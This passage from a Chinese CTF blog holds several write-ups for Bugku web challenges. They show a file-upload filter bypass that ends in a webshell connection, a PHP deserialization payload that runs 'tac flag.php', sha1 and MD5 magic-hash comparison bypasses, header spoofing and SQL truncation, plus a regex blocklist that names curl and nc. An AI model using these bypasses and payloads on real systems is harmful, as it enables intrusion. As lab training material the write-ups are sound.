-    <title>Bugku Web32</title>
-    <url>/2021/04/28/Bugku-Web32/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web32"><a href="#Bugku-Web32" class="headerlink" title="Bugku Web32"></a>Bugku Web32</h1><p>这个题有些许的坑（如果独自做题的话需要猜源码中过滤了什么），这里直接贴源码，可以发现白名单里有php4，并且还要求<code>multipart/form-data</code>不能是<code>multipart/form-data</code>,所以上传的时候需要将<code>multipart/form-data</code>改成<code>Multipart/form-data</code>来绕过检测，直接burp修改数据包，然后用蚁剑连接，便可以找到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$type =  $_SERVER[<span class="string">&quot;CONTENT_TYPE&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($type,<span class="string">&quot;multipart/form-data&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">		<span class="keyword">if</span> (stripos($file_ext,<span class="string">&quot;php&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line"><span class="keyword">if</span> ((stripos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>],<span class="string">&#x27;image&#x27;</span>)!== <span class="literal">False</span>) &amp;&amp; ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">        $allowexts = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$allowexts))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;give me a image file not a php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bugku&quot;</span>.date(<span class="string">&#x27;dHis&#x27;</span>).<span class="string">&quot;_&quot;</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	    	<span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (!file_exists(<span class="string">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class="line">	    		mkdir (<span class="string">&quot;./upload/&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class="line">                $filepath = <span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">	      	<span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .<span class="string">&quot;&lt;a href=&#x27;&quot;</span> . $filepath . <span class="string">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . $filepath . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/28/EnRi5YvATQrpLIZ.png" alt="3.png"><br><img src="https://i.loli.net/2021/04/28/l7rkO9WLfUYSFKh.png" alt="2.png"><br><img src="https://i.loli.net/2021/04/28/Kn3RW8AiZaEypkL.png" alt="1.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web 安慰奖</title>
-    <url>/2021/04/27/Bugku-Web-%E5%AE%89%E6%85%B0%E5%A5%96/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-安慰奖"><a href="#Bugku-Web-安慰奖" class="headerlink" title="Bugku Web 安慰奖"></a>Bugku Web 安慰奖</h1><p>&emsp;&emsp;进入场景一片空白，查看源码发现<code>YmFja3Vwcw==</code>用base64解码得到backups，所以需要查看备份文件，用御剑扫描网站页面，发现了index.php.bak，访问后得到了一段如下的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;分析可知我们需要传入code参数，内容是一段序列化的代码，代码在传入之后会被执行，以此构建payload,同时可以发现通过正则式过滤掉了一些输入，发现tac没有被过滤因此使用tac命令</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd=<span class="string">&#x27;tac flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ctf=<span class="keyword">new</span> ctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($ctf);</span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行后得到<br><code>O:3:&quot;ctf&quot;:2:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:6:&quot;*cmd&quot;;s:12:&quot;tac flag.php&quot;;&#125;</code><br>为了绕过_wakeup<code>原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code>，将对象数改为大于3的，同时为了绕过protected，在变量名前后加上%00，此时构造好的URL为<code>http://114.67.246.176:11386/?code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:12:&quot;tac%20flag.php&quot;;&#125;</code><br>之后便得到了flag<br>flag{Unser1alize_and_2CE_Add} </p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web30</title>
-    <url>/2021/04/27/Bugku-Web30/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web30"><a href="#Bugku-Web30" class="headerlink" title="Bugku Web30"></a>Bugku Web30</h1><blockquote>
-<p>描述：txt</p>
-</blockquote>
-<p>&emsp;&emsp;进入场景，看到如下的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;其中的几个函数的功能分别如下所示：</p>
-<p>&emsp;&emsp;extract()   </p>
-<p>&emsp;&emsp;函数从数组中将变量导入到当前的符号表。  </p>
-<p>&emsp;&emsp;语法：<code>extract(array,extract_rules,prefix)</code>  </p>
-<p>&emsp;&emsp;该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p>
-<p>&emsp;&emsp;file_get_contents()</p>
-<p>&emsp;&emsp;把整个文件读入一个字符串中。</p>
-<p>&emsp;&emsp;语法：</p>
-<p>&emsp;&emsp;<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
-<p>&emsp;&emsp;该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
-<p>&emsp;&emsp;trim()</p>
-<p>&emsp;&emsp;函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<p>&emsp;&emsp;语法<code>trim(string,charlist)</code></p>
-<p>&emsp;&emsp;经过分析，该段代码是将通过GET方法传入的参数赋值给其中某个变量，传入的参数如果和$fn文件中的字符一致时，便可以得到flag，题目的提示是txt，尝试访问flag.txt,浏览器显示了一下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;因此$ac的值便应该是bugku，此时尝试构造输入<code>http://114.67.246.176:11360/?ac=bugku</code>结果返回了sorry！，可能fn也需要传值，再构造<code>http://114.67.246.176:11360/?ac=bugku&amp;fn=flag.txt</code>,此时正确返回了flag</p>
-<p><img src="https://i.loli.net/2021/04/27/OI9cKMUoXQWZmax.png" alt="1.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web29</title>
-    <url>/2021/04/26/Bugku-Web29/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web29"><a href="#Bugku-Web29" class="headerlink" title="Bugku Web29"></a>Bugku Web29</h1><blockquote>
-<p>提示：各种绕过</p>
-</blockquote>
-<p>&emsp;&emsp;进入环境，看到了如下一段代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;经过分析可以知道传入了三个参数，uname和id通过GET传入，passwd通过post传入，绕过条件是uname和passwd不能’==’而且他们的sha1要’==’，这时可以通过数组来绕过sha1构造输入<code>http://114.67.246.176:13764/?id=margin&amp;uname[]=12</code>,并通过hackbar 通过post传递<code>passwd[]=11</code>,便可成功绕过得到flag<br><img src="https://i.loli.net/2021/04/26/UpgSORAfkr4ajZF.png" alt="2.png"></p>
-<p>此处附上php中各种类型的比较</p>
-<p><img src="https://i.loli.net/2021/04/26/TDdn5l12otYbSxB.png" alt="3.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web28</title>
-    <url>/2021/04/26/Bugku-Web28/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web28"><a href="#Bugku-Web28" class="headerlink" title="Bugku Web28"></a>Bugku Web28</h1><blockquote>
-<p>提示：请从本地访问</p>
-</blockquote>
-<p>&emsp;&emsp;这道题与之前一道一样，通过burp在header中加上<code>X-Forwarded-For: 127.0.0.1</code>即可得到flag<br><img src="https://i.loli.net/2021/04/26/YV2qiQy4kZGR8sd.png" alt="2.png"></p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web27</title>
-    <url>/2021/04/26/Bugku-Web27/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web27"><a href="#Bugku-Web27" class="headerlink" title="Bugku Web27"></a>Bugku Web27</h1><blockquote>
-<p>提示：md5 collision</p>
-</blockquote>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，发现整个页面只有一句话<code>please input a</code>，结合提示应该利用md5碰撞猜出a的值，进而得到flag<br>但是这个环境没有源码，所幸在评论区有老哥提供了源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;通过查看源码可以发现，a的值要与<code>QNKCDZO</code>不同，但是他们的md5值要”==”,首先可以得到$md51的值为<code>0e830400451993494058024219903391</code>是0e开头的，而且比较用的是<code>==</code>而非<code>===</code>,该值会被解释为科学计数法，即为0的n次方，结果都为0，所以我们只需让a的md5值也为0e开头，比如<code>240610708</code>,其md5值为<code>0e462097431906509019562988736854</code>。</p>
-<p>&emsp;&emsp;构造输入<code>http://114.67.246.176:14991/?a=240610708</code>,即可得到flag<code>flag&#123;928c4b84b2bbe0904ea63baa2b5e7f26&#125;</code></p>
-<h2 id="php中运算符"><a href="#php中运算符" class="headerlink" title="php中运算符"></a>php中运算符</h2><p><img src="https://i.loli.net/2021/04/26/kR6PwZgad8rmvus.png" alt="3.png"></p>
-<h2 id="常见的以0e-开头的MD5碰撞"><a href="#常见的以0e-开头的MD5碰撞" class="headerlink" title="常见的以0e 开头的MD5碰撞"></a>常见的以0e 开头的MD5碰撞</h2><p>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web26</title>
-    <url>/2021/04/26/Bugku-Web26/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web26"><a href="#Bugku-Web26" class="headerlink" title="Bugku Web26"></a>Bugku Web26</h1><blockquote>
-<p>Google</p>
-</blockquote>
-<p>进入场景，只有一行小字</p>
-<blockquote>
-<p>are you from google<br>推测应该将Referer改为谷歌的网址<br>用hackbar或者burpsuite都可以做到<br><img src="https://i.loli.net/2021/04/26/csMgnaRJ1Vr5OSz.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/pPDgWoYyNB9vtjk.png" alt="2.png"></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>Bugku Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bugku Web25</title>
-    <url>/2021/04/26/Bugku-Web25/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-25"><a href="#Bugku-Web-25" class="headerlink" title="Bugku Web 25"></a>Bugku Web 25</h1><blockquote>
-<p>提示是SQL约束攻击</p>
-</blockquote>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，看到是一个web管理系统，需要登陆，旁边可以看到注册的通道，先随意注册一个账号<br><img src="https://i.loli.net/2021/04/26/T3y4NEZFHDtqQ8a.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/Itpq6YvGl3Z4OP2.png" alt="2.jpg"><br><img src="https://i.loli.net/2021/04/26/xUlTGruCJoZKLm9.png" alt="3.png"></p>
-<p>&emsp;&emsp;推测只有管理员账户才会显示出flag，利用SQL约束攻击，SQL语句会将查询的字段后的空格格式化，随意我们注册的用户名为<code>admin </code>，此时再登录就可以得到flag<br><img src="https://i.loli.net/2021/04/26/iIjEn9GfueochHr.png" alt="4.png"></p>
-<h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>&emsp;&emsp;例如下面的代码中，输入的字符串末尾空格会被删除，<code>admin</code>与<code>admin     </code>是一样的,这是因为在“字符串比较”期间，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp; 当注册时，后台一般先select一下用户名看看是否存在，然后再insert</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span 